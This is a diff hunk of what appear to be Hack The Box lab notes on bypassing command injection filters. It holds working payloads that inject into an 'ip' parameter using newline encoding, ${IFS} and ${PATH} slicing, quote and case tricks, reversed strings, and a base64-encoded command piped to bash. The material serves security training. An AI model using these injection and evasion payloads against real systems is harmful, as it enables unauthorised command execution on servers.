@@ -68,7 +68,12 @@ ip=127.0.0.1%0a${IFS}c"a"t%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.t
 ```sh
 echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64
 ```
-
+```
+[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+```
+```
+[/htb]$ $(rev<<<'imaohw')
+```
 ```sh
 ip=127.0.0.1%0abas$@h<<<$(ba$@se6$@4${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
 ```
